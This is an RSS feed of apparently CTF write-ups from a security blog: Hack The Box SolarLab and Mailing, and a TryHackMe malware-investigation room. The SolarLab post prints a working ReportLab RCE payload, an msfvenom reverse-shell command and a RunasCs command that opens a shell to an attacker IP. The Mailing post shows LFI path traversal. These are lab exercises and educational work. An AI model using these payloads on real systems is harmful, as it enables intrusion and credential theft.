<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Scorpiosec</title>
        <link>https://scorpiosec.com/posts/</link>
        <description>Recent content in Posts on Scorpiosec</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 20 Sep 2024 13:33:36 -0500</lastBuildDate>
        <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HTB: SolarLab</title>
            <link>https://scorpiosec.com/posts/2024/09/htb-solarlab/</link>
            <pubDate>Fri, 20 Sep 2024 13:33:36 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/09/htb-solarlab/</guid>
            <description>Platform: Hack The Box Link: SolarLab Level: Medium OS: Windows SolarLab begins with a basic website that, after enumeration, offers no direct exploitation paths. Shifting focus to SMB, we discover a document in a file share containing credentials. These credentials grant access to ReportHub, accessible at a subdomain found during previous enumeration. Upon examining its functionality, we identify that it generates PDFs using the vulnerable ReportLab library (CVE-2023-33733), which allows us to exploit this and gain initial access, recovering the user flag.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/SolarLab" target="_blank" >SolarLab</a>

</li>
<li>Level: Medium</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>SolarLab begins with a basic website that, after enumeration, offers no direct exploitation paths. Shifting focus to SMB, we discover a document in a file share containing credentials. These credentials grant access to ReportHub, accessible at a subdomain found during previous enumeration. Upon examining its functionality, we identify that it generates PDFs using the vulnerable ReportLab library (CVE-2023-33733), which allows us to exploit this and gain initial access, recovering the user flag.</p>
<p>Further exploration reveals several internal services, including an Openfire admin console accessed via tunneling. Exploiting a known vulnerability in the Openfire version (CVE-2023-32315), we gain access to the admin console and escalate privileges by uploading a malicious plugin coupled with a reverse shell command. Finally, by decrypting credentials found in an Openfire file, we obtain an admin shell and recover the root flag.</p>
<p>Target IP address - <code>10.10.11.16</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/SolarLab -p- 10.10.11.16
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-20 13:32 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.16
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65530</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http          nginx 1.24.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://solarlab.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
</span></span><span style="display:flex;"><span>6791/tcp open  http          nginx 1.24.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-09-20T18:35:13
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 176.37 seconds
</span></span></code></pre></div><p>Ports discovered:</p>
<ul>
<li>80 - HTTP with Nginx 1.24.0 redirecting to <code>http://solarlab.htb/</code></li>
<li>135 - RPC</li>
<li>139 (NetBIOS) &amp; 445 (SMB)</li>
<li>6791 - HTTP with nginx with a second redirection to <code>http://report.solarlab.htb:6791/</code></li>
</ul>
<p>We update the hosts file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.16 solarlab.htb report.solarlab.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The website features a messaging service that is supposed to be &ldquo;unhackable&rdquo;.</p>
<p><img src="/images/HTB-SolarLab/solarlab-website.png" alt="SolarLab website"></p>
<p>The source code of the webpage doesn&rsquo;t reveal anything useful.</p>
<p>After enumerating SMB we find that we can read the <code>Documents</code> share.</p>
<pre tabindex="0"><code>netexec smb 10.10.11.16 -u Guest -p &#34;&#34; --shares
</code></pre><p><img src="/images/HTB-SolarLab/smb_enum.png" alt="SolarLab shares enumeration"></p>
<p>We use smbclient to access the share and find four files, two right after accessing the share and two additional files in the <code>concepts</code> directory:</p>
<ul>
<li><code>details-file.xlsx</code></li>
<li><code>old_leave_request_form.docx</code></li>
<li><code>Training-Request-Form.docx</code></li>
<li><code>Travel-Request-Sample.docx</code></li>
</ul>
<pre tabindex="0"><code>smbclient //10.10.11.16/Documents -U Guest
</code></pre><p><img src="/images/HTB-SolarLab/share_files.png" alt="SolarLab shares files"></p>
<p>We can download all the files with <code>get</code>.</p>
<p><img src="/images/HTB-SolarLab/files-downloads.png" alt="SolarLab shares files download"></p>
<p>After examining each document we find some credentials in <code>details-file.xlsx</code>.</p>
<p><img src="/images/HTB-SolarLab/password-file.png" alt="Credentials found"></p>
<p>So far the only way we can use those credentials is with SMB. It turns out that those credentials are valid but the available shares are still the same ones we could access with the guest account.</p>
<pre tabindex="0"><code>netexec smb 10.10.11.16 -u KAlexander -p &#34;dkjafblkjadsfgl&#34;

netexec smb 10.10.11.16 -u blake -p &#34;ThisCanB3typedeasily1@&#34;

netexec smb 10.10.11.16 -u ClaudiaS -p &#34;dadsfawe9dafkn&#34;
</code></pre><p><img src="/images/HTB-SolarLab/smb_logins.png" alt="SMB logins"></p>
<p>Moving on, directory enumeration is also unfruitful.</p>
<pre tabindex="0"><code>gobuster dir -u http://solarlab.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src="/images/HTB-SolarLab/gobuster.png" alt="SolarLab directory bruteforcing"></p>
<p>Let&rsquo;s check the second subdomain. When we go to <code>http://report.solarlab.htb:6791/</code> we find a login form for ReportHub.</p>
<p><img src="/images/HTB-SolarLab/reporthub_solarlab.png" alt="SolarLab report subdomain"></p>
<p>The only credentials we have so far are the ones from the password file, after several tries we are able to login with <code>blakeb:ThisCanB3typedeasily1@</code>.</p>
<p><img src="/images/HTB-SolarLab/dashboard.png" alt="SolarLab Dashboard"></p>
<p>We can choose which option we want, fill the form and get a pdf file. We can also upload a picture for the signature (which might be a way to exploit the target).</p>
<p><img src="/images/HTB-SolarLab/Leave-Request-form.png" alt="Leave request form"></p>
<p>Below is an example of the PDF generated.</p>
<p><img src="/images/HTB-SolarLab/pdf-generated.png" alt="pdf generated"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>Using exiftool on the PDF generated we discover that it is produced by reportlab.</p>
<pre tabindex="0"><code>exiftool output.pdf
</code></pre><p><img src="/images/HTB-SolarLab/output_pdf.png" alt="exiftool results"></p>
<p>We find a PoC for Reportlab (<a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0" target="_blank" >CVE-2023-33733</a>

) that leads to RCE <a href="https://github.com/c53elyas/CVE-2023-33733/tree/master" target="_blank" >here</a>

.</p>
<blockquote>
<p>I used the <code>Travel Approval</code> option here but you can make the exploit work with the other options.</p>
</blockquote>
<p><img src="/images/HTB-SolarLab/Travel_Approval.png" alt="Travel Approval"></p>
<p>After catching the request and sending it to the repeater with Burp. We insert our payload and make sure to match the <code>filename</code> value with the one for <code>Content-Type</code>.</p>
<blockquote>
<p>We get a reverse shell from <a href="https://www.revshells.com/" target="_blank" >revshells</a>

 using the option <code>PowerShell #3 (Base64)</code>.</p>
</blockquote>
<p><img src="/images/HTB-SolarLab/payload-RCE.png" alt="ReportLab RCE"></p>
<p><strong>Payload used</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">para</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[[[getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;INSERT_REVSHELL_HERE&#39;) for Word in [ orgTypeFun( &#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: 1 == 0, &#39;__eq__&#39;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: { setattr(self, &#39;mutated&#39;, self.mutated - 1) }, &#39;__hash__&#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#39;red&#39;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>                exploit
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">para</span>&gt;
</span></span></code></pre></div><p>On our listener we get a shell as Blake and the user flag is found in the Desktop directory.</p>
<p><img src="/images/HTB-SolarLab/user_flag.png" alt="User flag"></p>
<h3 id="shell-as-openfire">Shell as openfire</h3>
<p>There is a <code>openfire</code> user on the target.</p>
<p><img src="/images/HTB-SolarLab/users_list.png" alt="User list"></p>
<p>With <code>netstat -ano</code> we check all the services running on the target. In order to access the internal services we use tunneling.</p>
<blockquote>
<p>I personally prefer <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" >ligolo-ng</a>

 but you can also use chisel.</p>
</blockquote>
<p><img src="/images/HTB-SolarLab/netstat.png" alt="netstat command"></p>
<p>After trying various ports we find an Openfire Administration Console on port 9090.</p>
<p><img src="/images/HTB-SolarLab/Openfire-console.png" alt="Openfire admin console"></p>
<p>This is the admin console, no credentials we have so far are working. I remember this version of Openfire being vulnerable to <a href="https://vulncheck.com/blog/openfire-cve-2023-32315" target="_blank" >CVE-2023-32315</a>

 with a PoC being available <a href="https://github.com/miko550/CVE-2023-32315" target="_blank" >here</a>

.</p>
<blockquote>
<p>This exploitation method was used for HTB: Jab, but we already had credentials back then</p>
</blockquote>
<ol>
<li>We login with the newly created account</li>
</ol>
<pre tabindex="0"><code>python3 CVE-2023-32315.py -t http://240.0.0.1:9090
</code></pre><p><img src="/images/HTB-SolarLab/openfire-new-account.png" alt="Openfire new account"></p>
<p>Once logged in we need to upload a malicious plugin in the <code>Plugin</code> section. The malicious plugin is the <code>openfire-management-tool-plugin.jar</code> file available in the PoC repository.</p>
<p><img src="/images/HTB-SolarLab/malicious-plugin.png" alt="Openfire malicious plugin"></p>
<p>Go to <code>Server</code> &ndash;&gt; <code>Server Settings</code> &ndash;&gt; <code>Management Tool</code>, input the password <code>123</code> and click <code>Login</code>. You get some information about the server.</p>
<p>Select <code>system command</code> in the drop-down menu.</p>
<p><img src="/images/HTB-SolarLab/system_cmd.png" alt="Openfire system command"></p>
<p>Get another Powershell base64 encoded reverse shell from <a href="https://www.revshells.com/" target="_blank" >revshells</a>

 and execute it. On the listener we get a shell as <code>openfire</code>.</p>
<p><img src="/images/HTB-SolarLab/execute-cmd.png" alt="Openfire execute command"></p>
<p><img src="/images/HTB-SolarLab/openfire_shell.png" alt="Openfire shell"></p>
<h2 id="privilege-escation-admin-shell">Privilege Escation (admin shell)</h2>
<p>We still cannot find the root flag but after some system exploration we find a file called <code>openfire.script</code> in <code>C:\Program Files\Openfire\embedded-db</code>.</p>
<p>The file contains the credentials of the admin user but the password needs to be decrypted. Forunately we have the password hash and the key.</p>
<p><img src="/images/HTB-SolarLab/encrypted-pwd.png" alt="Openfire encrypted password"></p>
<ul>
<li>Password hash: <code>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></li>
<li>Key value: <code>hGXiFzsKaAeYLjn</code></li>
</ul>
<p>We can decrypt those with <a href="https://github.com/c0rdis/openfire_decrypt" target="_blank" >openfire_decrypt</a>

 by using the command below.</p>
<pre tabindex="0"><code>java OpenFireDecryptPass [PASSWORD_HASH] [KEY_VALUE]
</code></pre><p><img src="/images/HTB-SolarLab/java-openfire-decrypt.png" alt="Openfire password decrytion"></p>
<p>The credentials are: <code>admin:ThisPasswordShouldDo!@</code>.</p>
<p>I tried to login with Evil-WinRM but it was not working so we resort to using RunasCs.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -a x64 --platform windows -o shell.exe
</code></pre><p>After sending both <code>shell.exe</code> and <code>RunasCs.exe</code> to the target, we run the command below.</p>
<blockquote>
<p>Setup a listener before running the runascs.exe command</p>
</blockquote>
<pre tabindex="0"><code>.\runascs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.14.176:5555
</code></pre><p><img src="/images/HTB-SolarLab/runascs_root.png" alt="runascs root command"></p>
<p>On our listener we get a shell as administrator and we find the root flag in the Desktop directory.</p>
<p><img src="/images/HTB-SolarLab/root_flag.png" alt="root shell &amp; root flag"></p>
]]></content>
        </item>
        
        <item>
            <title>THM: Friday Overtime</title>
            <link>https://scorpiosec.com/posts/2024/09/thm-friday-overtime/</link>
            <pubDate>Thu, 19 Sep 2024 21:09:28 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/09/thm-friday-overtime/</guid>
            <description>Platform: TryHackMe Link: Friday Overtime Level: Medium For this blue team challenge we need to conduct an investigation and provide answers to some questions.
After launching the provided VM we login with the credentials ericatracy:Intel321!.
Who shared the malware samples? Right after logging in we find a document titled Urgent: Malicious Malware Artefacts Detected.
The author of the document is Oliver Bennett.
Answer: Oliver Bennett
What is the SHA1 hash of the file &amp;ldquo;pRsm.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/r/room/fridayovertime" target="_blank" >Friday Overtime</a>

</li>
<li>Level: Medium</li>
</ul>
<hr>
<p>For this blue team challenge we need to conduct an investigation and provide answers to some questions.</p>
<p>After launching the provided VM we login with the credentials <code>ericatracy:Intel321!</code>.</p>
<h2 id="who-shared-the-malware-samples">Who shared the malware samples?</h2>
<p>Right after logging in we find a document titled <code>Urgent: Malicious Malware Artefacts Detected</code>.</p>
<p><img src="/images/THM-Friday_Overtime/urgent_doc.png" alt="latest document"></p>
<p>The author of the document is <code>Oliver Bennett</code>.</p>
<p><img src="/images/THM-Friday_Overtime/author.png" alt="document author"></p>
<p>Answer: <code>Oliver Bennett</code></p>
<h2 id="what-is-the-sha1-hash-of-the-file-prsmdll-inside-sampleszip">What is the SHA1 hash of the file &ldquo;pRsm.dll&rdquo; inside samples.zip?</h2>
<p>Click on <code>Documents</code> then on <code>View All</code>.</p>
<p><img src="/images/THM-Friday_Overtime/view_all_docs.png" alt="View all documents"></p>
<p>After selecting <code>Urgent: Malicious Malware Artefacts Detected</code> document, scroll down and you will find <code>samples.zip</code> on the right side.</p>
<p><img src="/images/THM-Friday_Overtime/samples_zip.png" alt="malware file"></p>
<p>We extract it, the password is <code>Panda321!</code>.</p>
<p><img src="/images/THM-Friday_Overtime/unzip_samples_zip.png" alt="malware file extraction"></p>
<p>We then compute the hash of <code>pRsm.dll</code>.</p>
<pre tabindex="0"><code>sha1sum pRsm.dll
</code></pre><p><img src="/images/THM-Friday_Overtime/sha1_hash.png" alt="sha1 hash"></p>
<p>Answer: <code>9d1ecbbe8637fed0d89fca1af35ea821277ad2e8</code></p>
<h2 id="which-malware-framework-utilizes-these-dlls-as-add-on-modules">Which malware framework utilizes these DLLs as add-on modules?</h2>
<p>We compute the sha256 hash for the <code>pRsm.dll</code> file and search for it on VirusTotal.</p>
<pre tabindex="0"><code>2c0cfe2f4f1e7539b4700e1205411ec084cbc574f9e4710ecd4733fbf0f8a7dc
</code></pre><p><img src="/images/THM-Friday_Overtime/sha256_dll.png" alt="sha256 hash"></p>
<p>We discover the family labels attached to this file.</p>
<p><img src="/images/THM-Friday_Overtime/family_labels_VT.png" alt="VirusTotal family label"></p>
<p>Answer: <code>MgBot</code></p>
<h2 id="which-mitre-attck-technique-is-linked-to-using-prsmdll-in-this-malware-framework">Which MITRE ATT&amp;CK Technique is linked to using pRsm.dll in this malware framework?</h2>
<p>We research <code>MITRE ATT&amp;CK Technique pRsm.dll</code> and find <a href="https://www.welivesecurity.com/2023/04/26/evasive-panda-apt-group-malware-updates-popular-chinese-software/" target="_blank" >this article</a>

.</p>
<p><img src="/images/THM-Friday_Overtime/pRsm_search.png" alt="pRsm.dll MITRE ATT&amp;CK Technique"></p>
<p>Searching for <code>pRsm.dll</code> on the page we find the technique ID to be <a href="https://attack.mitre.org/versions/v12/techniques/T1123" target="_blank" >T1123</a>

.</p>
<p><img src="/images/THM-Friday_Overtime/technique_ID.png" alt="Technique ID"></p>
<p>Answer: <code>T1123</code></p>
<h2 id="what-is-the-cyberchef-defanged-url-of-the-malicious-download-location-first-seen-on-2020-11-02">What is the CyberChef defanged URL of the malicious download location first seen on 2020-11-02?</h2>
<p>On the same page we find an url <code>http://update.browser.qq[.]com/qmbs/QQ/QQUrlMgr_QQ88_4296.exe</code>.</p>
<p><img src="/images/THM-Friday_Overtime/defanged_url.png" alt="url provided"></p>
<p>On <a href="https://cyberchef.org/" target="_blank" >cyberchef.org</a>

 we use the <code>defang URL</code> recipe to get the correct URL.</p>
<p><img src="/images/THM-Friday_Overtime/defanged_url2.png" alt="defanged url"></p>
<p>Answer: <code>hxxp[://]update[.]browser[.]qq[.]com/qmbs/QQ/QQUrlMgr_QQ88_4296[.]exe</code></p>
<h2 id="what-is-the-cyberchef-defanged-ip-address-of-the-cc-server-first-detected-on-2020-09-14-using-these-modules">What is the CyberChef defanged IP address of the C&amp;C server first detected on 2020-09-14 using these modules?</h2>
<p>Using the same article, under the <code>Network</code> section we find an IP address for the specified date.</p>
<p><img src="/images/THM-Friday_Overtime/IP_address.png" alt="IP address"></p>
<p><img src="/images/THM-Friday_Overtime/defanged_IP.png" alt="Defanged IP address"></p>
<p>With cyberchef we get the defanged IP address with the <code>Defang IP addresses</code> recipe.</p>
<p>Answer: <code>122[.]10[.]90[.]12</code></p>
<h2 id="what-is-the-sha1-hash-of-the-spyagent-family-spyware-hosted-on-the-same-ip-targeting-android-devices-on-november-16-2022">What is the SHA1 hash of the spyagent family spyware hosted on the same IP targeting Android devices on November 16, 2022?</h2>
<p>On VirusTotal we search for <code>122.10.90.12</code> and go to the <code>Relations</code> section.</p>
<p><img src="/images/THM-Friday_Overtime/android_spyware.png" alt="Communicated files"></p>
<p>We then search for <code>951F41930489A8BFE963FCED5D8DFD79</code> and under <code>Details</code> we find the SHA1 hash.</p>
<p><img src="/images/THM-Friday_Overtime/sha1_android.png" alt="sha1 android file hash"></p>
<p>Answer: <code>1c1fe906e822012f6235fcc53f601d006d15d7be</code></p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Mailing</title>
            <link>https://scorpiosec.com/posts/2024/09/htb-mailing/</link>
            <pubDate>Fri, 06 Sep 2024 23:42:37 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/09/htb-mailing/</guid>
            <description>Platform: Hack The Box Link: Mailing Level: Easy OS: Windows Mailing from HackTheBox is an interesting box. After our initial scan, we discover several email-related services. By exploiting an LFI vulnerability, we find two password hashes, and successfully cracking one of them gives us the admin password. We then use the recent MonikerLink vulnerability to retrieve a user&amp;rsquo;s NTLM hash, which provides us with our initial foothold. Privilege escalation is achieved by placing a malicious file in a specific directory where all files with the .</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Mailing" target="_blank" >Mailing</a>

</li>
<li>Level: Easy</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>Mailing from HackTheBox is an interesting box. After our initial scan, we discover several email-related services. By exploiting an LFI vulnerability, we find two password hashes, and successfully cracking one of them gives us the admin password. We then use the recent MonikerLink vulnerability to retrieve a user&rsquo;s NTLM hash, which provides us with our initial foothold. Privilege escalation is achieved by placing a malicious file in a specific directory where all files with the <code>.odt</code> extension are automatically executed, granting us admin privileges.</p>
<p>Target IP address - <code>10.10.11.14</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Mailing 10.10.11.14
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-07 00:50 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.14
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">990</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>25/tcp  open  smtp          hMailServer smtpd
</span></span><span style="display:flex;"><span>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style="display:flex;"><span>80/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://mailing.htb
</span></span><span style="display:flex;"><span>110/tcp open  pop3          hMailServer pop3d
</span></span><span style="display:flex;"><span>|_pop3-capabilities: UIDL TOP USER
</span></span><span style="display:flex;"><span>135/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>143/tcp open  imap          hMailServer imapd
</span></span><span style="display:flex;"><span>|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA RIGHTS<span style="color:#f92672">=</span>texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds?
</span></span><span style="display:flex;"><span>465/tcp open  ssl/smtp      hMailServer smtpd
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>mailing.htb/organizationName<span style="color:#f92672">=</span>Mailing Ltd/stateOrProvinceName<span style="color:#f92672">=</span>EU<span style="color:#ae81ff">\S</span>pain/countryName<span style="color:#f92672">=</span>EU
</span></span><span style="display:flex;"><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style="display:flex;"><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style="display:flex;"><span>587/tcp open  smtp          hMailServer smtpd
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>mailing.htb/organizationName<span style="color:#f92672">=</span>Mailing Ltd/stateOrProvinceName<span style="color:#f92672">=</span>EU<span style="color:#ae81ff">\S</span>pain/countryName<span style="color:#f92672">=</span>EU
</span></span><span style="display:flex;"><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style="display:flex;"><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style="display:flex;"><span>993/tcp open  ssl/imap      hMailServer imapd
</span></span><span style="display:flex;"><span>|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA RIGHTS<span style="color:#f92672">=</span>texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>mailing.htb/organizationName<span style="color:#f92672">=</span>Mailing Ltd/stateOrProvinceName<span style="color:#f92672">=</span>EU<span style="color:#ae81ff">\S</span>pain/countryName<span style="color:#f92672">=</span>EU
</span></span><span style="display:flex;"><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style="display:flex;"><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style="display:flex;"><span>Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-09-07T05:51:14
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 68.70 seconds
</span></span></code></pre></div><p>Many open ports are discovered. We have various services such as SMTP, POP3, HTTP, SMB, and IMAP; as alluded by the box name this point us to an email set up. We also have a redirection to <code>mailing.htb</code> which we add to the hosts file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.14 mailing.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>Visiting <code>http://mailing.htb/</code> we find a website for a secure email service powered by <a href="https://www.hmailserver.com/" target="_blank" >hmailserver</a>

.</p>
<p><img src="/images/HTB-Mailing/mailing-website.png" alt="Mailing website"></p>
<p>The only thing we can do is download a pdf file, detailing the instructions for the installation process.</p>
<p><img src="/images/HTB-Mailing/download_instructions.png" alt="Download instructions button"></p>
<p>Continuing with the enumeration process, directory and subdomain enumeration are both unfruitful.</p>
<pre tabindex="0"><code>gobuster dir -u http://mailing.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u http://mailing.htb/ -H &#34;Host: FUZZ.mailing.htb&#34; -ic -fs 4681
</code></pre><p>After capturing the request we get with the <code>Download Instructions</code> button we can observe the <code>file</code> parameter being included. If this is not properly secured we could have a potential LFI vulnerability (Local File Inclusion).</p>
<p><img src="/images/HTB-Mailing/download-request.png" alt="Mailing Download button request"></p>
<p>We see that the application is using <code>ASP.NET</code> with <code>IIS</code> for the server. We know that the <code>web.config</code> file must be present at the web root location <code>C:\inetpub\wwwroot</code> for <code>ASP.NET</code> applications to function correctly. So we can try to read the content of the file in order to confirm our LFI possibility.
<em>Read more about it <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0#webconfig-file-location" target="_blank" >here</a>

.</em></p>
<p><img src="/images/HTB-Mailing/wappalyzer.png" alt="Mailing wappalyzer"></p>
<p>Using <code>../../inetpub/wwwroot/web.config</code> for the file value</p>
<p><img src="/images/HTB-Mailing/IIS-web-config.png" alt="Mailing LFI test"></p>
<p>We get a hit and are able to read the file.</p>
<p><img src="/images/HTB-Mailing/web-config-content.png" alt="Mailing web.config content"></p>
<p>The next step will be to try to read some sensitive files. We already know that the target is using hmailserver so we will focus on that, let&rsquo;s search for <code>hmailserver ini ile location</code>.</p>
